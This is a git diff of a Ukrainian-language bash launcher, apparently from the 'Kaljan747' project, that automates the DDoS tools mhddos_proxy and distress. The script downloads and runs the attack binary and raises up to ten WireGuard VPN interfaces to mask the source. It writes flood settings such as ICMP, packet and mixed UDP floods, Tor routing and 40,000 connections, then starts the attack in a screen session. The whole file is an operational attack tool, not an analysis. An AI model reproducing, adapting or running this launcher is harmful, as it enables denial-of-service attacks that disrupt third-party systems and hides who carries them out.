@@ -1,7 +1,5 @@
 #!/bin/bash
-
 set -e
-
 
 print_header() {
     echo -e "\e[1;36m========================================"
@@ -9,24 +7,12 @@ print_header() {
     echo -e "========================================\e[0m"
 }
 
-print_summary() {
-    echo -e "\n\e[1;33m----------------------------------------"
-    echo -e "📦  Встановлення залежностей: \e[1;32mOK\e[0m"
-    echo -e "🌍  Завантаження WG-конфігів: \e[1;32mOK\e[0m"
-    echo -e "⚙️  Запуск модуля: PID $1"
-    echo -e "----------------------------------------\e[0m"
-
-    echo -e "\n📨  Email-звіт буде надсилатись кожні 4 год. на \e[1;35muser@example.com\e[0m"
-}
-
 print_stage() {
     echo -e "\e[1;34m$1\e[0m"
 }
 
-
 SETTINGS_FILE="$HOME/.kaljan747_settings"
 
-# === Функція запиту USER-ID ===
 ask_user_id() {
     if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
         USER_ID=$(zenity --entry --title="Введення USER-ID" --text="Введіть ваш user-id (тільки цифри):" --width=400)
@@ -35,7 +21,6 @@ ask_user_id() {
     fi
 }
 
-# === Функція запиту параметрів запуску ===
 ask_run_parameters() {
     if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
         USER_SELECTION=$(zenity --forms --title="Kaljan747 Конфігурація" \
@@ -72,63 +57,29 @@ ask_run_parameters() {
     fi
 }
 
-# === Завантаження або запит налаштувань ===
+# === Завантаження або введення налаштувань ===
 if [ -f "$SETTINGS_FILE" ]; then
-    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
-        zenity --question --title="Налаштування" --text="Використати збережені налаштування?" --ok-label="Так" --cancel-label="Ні"
-        USE_OLD=$?
-    else
-        echo "Знайдено збережені налаштування:"
-        echo "1) Використати старі"
-        echo "2) Ввести нові"
-        read -p "Ваш вибір (1/2): " choice
-        if [ "$choice" = "1" ]; then
-            USE_OLD=0
-        else
-            USE_OLD=1
-        fi
-    fi
-
-    if [ "$USE_OLD" -eq 0 ]; then
-        source "$SETTINGS_FILE"
-    else
-        USER_ID=""
-        SELECTED_MODULE=""
-        EDIT_INI=""
-        SELECTED_RUN_MODE=""
-    fi
+    echo "1) Використати старі налаштування"
+    echo "2) Ввести нові"
+    read -p "Ваш вибір (1/2): " choice
+    [ "$choice" = "1" ] && source "$SETTINGS_FILE" || { USER_ID=""; SELECTED_MODULE=""; EDIT_INI=""; SELECTED_RUN_MODE=""; }
 fi
 
 if [ -z "$USER_ID" ]; then
     while true; do
         ask_user_id
-        if [ -z "$USER_ID" ]; then
-            echo "User-id обов'язковий. Завершення."
-            exit 1
-        fi
-        if [[ "$USER_ID" =~ ^[0-9]+$ ]]; then
-            break
-        else
-            if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
-                zenity --error --text="Помилка: USER-ID має містити тільки цифри!" --width=400
-            else
-                echo "Помилка: USER-ID має містити тільки цифри!"
-            fi
-        fi
+        [[ -z "$USER_ID" ]] && echo "User-id обов'язковий. Завершення." && exit 1
+        [[ "$USER_ID" =~ ^[0-9]+$ ]] && break || echo "USER-ID має містити тільки цифри!"
     done
 fi
 
-if [ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" ]; then
-    ask_run_parameters
-fi
+[ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" ] && ask_run_parameters
 
 print_header
 echo -e "📥  Отримано USER-ID: \e[1;32m$USER_ID\e[0m"
-echo -e "🧩  Обраний модуль: \e[1;36m$SELECTED_MODULE\e[0m"
-echo -e "🛠️  Режим запуску: \e[1;36m$SELECTED_RUN_MODE\e[0m"
+echo -e "🧩  Модуль: \e[1;36m$SELECTED_MODULE\e[0m"
+echo -e "🛠️  Режим: \e[1;36m$SELECTED_RUN_MODE\e[0m"
 
-
-# === Збереження налаштувань у файл ===
 cat > "$SETTINGS_FILE" <<EOF
 USER_ID="$USER_ID"
 SELECTED_MODULE="$SELECTED_MODULE"
@@ -136,40 +87,38 @@ EDIT_INI="$EDIT_INI"
 SELECTED_RUN_MODE="$SELECTED_RUN_MODE"
 EOF
 
-# === Перевірка прав користувача ===
-if [ "$(id -u)" -eq 0 ]; then
-    SUDO=""
-else
-    if command -v sudo >/dev/null 2>&1; then
-        SUDO="sudo"
-    else
-        echo "sudo не знайдено. Встановіть або увійдіть як root."
-        exit 1
-    fi
-fi
+# === sudo
+[ "$(id -u)" -eq 0 ] && SUDO="" || SUDO="sudo"
 
-# === Встановлення необхідних пакетів ===
-if command -v apt >/dev/null 2>&1; then
-    $SUDO apt update -y
-    $SUDO apt install -y curl wget git screen sed wireguard zenity
-elif command -v dnf >/dev/null 2>&1; then
-    $SUDO dnf install -y curl wget git screen sed wireguard-tools zenity
-elif command -v yum >/dev/null 2>&1; then
-    $SUDO yum install -y curl wget git screen sed wireguard-tools zenity
-elif command -v apk >/dev/null 2>&1; then
-    $SUDO apk add curl wget git screen sed wireguard-tools zenity
+# === Встановлення залежностей
+print_stage "📦  Встановлення залежностей..."
+
+INSTALL_PKGS="curl wget git screen sed wireguard-tools iproute2 zenity nano"
+
+if command -v apt >/dev/null; then
+    $SUDO apt update -y && $SUDO apt install -y $INSTALL_PKGS
+elif command -v dnf >/dev/null; then
+    $SUDO dnf install -y $INSTALL_PKGS
+elif command -v yum >/dev/null; then
+    $SUDO yum install -y $INSTALL_PKGS
+elif command -v apk >/dev/null; then
+    $SUDO apk add --no-cache $INSTALL_PKGS
+elif command -v pacman >/dev/null; then
+    $SUDO pacman -Sy --noconfirm $INSTALL_PKGS
+elif command -v zypper >/dev/null; then
+    $SUDO zypper install -y $INSTALL_PKGS
 else
-    echo "Підтримуваний пакетний менеджер не знайдено."
+    echo "❌ Пакетний менеджер не підтримується"
     exit 1
 fi
 
-# === Підготовка директорій ===
+# === Папки
 MODULE_DIR="$HOME/modules"
 WG_DIR="$HOME/wg_confs"
 mkdir -p "$MODULE_DIR" "$WG_DIR"
 touch "$MODULE_DIR/mhddos.ini" "$MODULE_DIR/distress.ini"
 
-# === Вибір модуля ===
+# === Завантаження модуля
 case "$SELECTED_MODULE" in
     mhddos_proxy)
         MODULE="$MODULE_DIR/mhddos_proxy"
@@ -188,6 +137,7 @@ esac
 [ -f "$MODULE" ] || wget -qO "$MODULE" "$DOWNLOAD_LINK"
 chmod +x "$MODULE"
 
+# === Завантаження WG-файлів
 print_stage "🌍  Завантаження WG-конфігів..."
 
 WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
@@ -196,49 +146,53 @@ WG_RAW_BASE="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"
 CONF_LIST=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=")[^"]+\.conf(?=")' | grep "/k7771/Kaljan747/blob/" | sed -E 's|^/k7771/Kaljan747/blob/k7771/wg/||')
 
 if [ -z "$CONF_LIST" ]; then
-    echo "❌ Не вдалося отримати список конфігів. Перевір з'єднання або посилання."
+    echo "❌ Не знайдено .conf файлів."
     exit 1
 fi
 
 for file in $CONF_LIST; do
     RAW_URL="$WG_RAW_BASE/$file"
     DEST="$WG_DIR/$(basename "$file")"
-
     if ! curl -fsSL "$RAW_URL" -o "$DEST"; then
-        echo "⚠️  curl не вдалося для $file, пробуємо wget..."
-        if ! wget -qO "$DEST" "$RAW_URL"; then
-            echo "❌ Не вдалося завантажити $file ні через curl, ні через wget"
-            continue
-        fi
+        echo "⚠️ curl не спрацював — пробую wget"
+        wget -qO "$DEST" "$RAW_URL" || echo "❌ Не вдалося: $file"
     fi
-
-    echo "✅ Завантажено: $file"
 done
 
 $SUDO chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true
 
-# === Зупинка активних WG ===
+# === Зупинка старих WG
 for iface in $(wg show interfaces 2>/dev/null); do
     $SUDO wg-quick down "$iface" || true
     $SUDO ip link delete "$iface" || true
 done
 
-# === Підключення нових WG ===
+# === Підключення WG
 WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 10))
 WG_IFACES=()
+
 for conf in "${WG_FILES[@]}"; do
     IFACE_NAME=$(basename "$conf" .conf)
-    $SUDO wg-quick up "$conf"
-    WG_IFACES+=("$IFACE_NAME")
+    if $SUDO wg-quick up "$conf" 2>/dev/null; then
+        if wg show "$IFACE_NAME" &>/dev/null; then
+            WG_IFACES+=("$IFACE_NAME")
+            echo "✅ Піднято: $IFACE_NAME"
+        else
+            echo "⚠️ Неактивний інтерфейс: $IFACE_NAME"
+        fi
+    else
+        echo "❌ Не вдалося запустити: $IFACE_NAME"
+    fi
     sleep 1
 done
+
+[ ${#WG_IFACES[@]} -eq 0 ] && echo "❌ Жоден WG не піднявся. Завершення." && exit 1
 
 VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
 VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")
 
-echo -e "📡  VPN-інтерфейси: \e[1;36m$VPN_LIST\e[0m"
+echo -e "📡 VPN-інтерфейси: \e[1;36m$VPN_LIST\e[0m"
 
-# === Оновлення ini файлів ===
 echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$MODULE_DIR/mhddos.ini"
 echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$MODULE_DIR/distress.ini"
 
@@ -251,7 +205,7 @@ if [ "$EDIT_INI" = "Так" ]; then
     fi
 fi
 
-# === Запуск модуля ===
+# === Запуск модуля
 case "$SELECTED_RUN_MODE" in
     "screen у фоні") screen -dmS "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
     "screen відкрито") screen -S "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
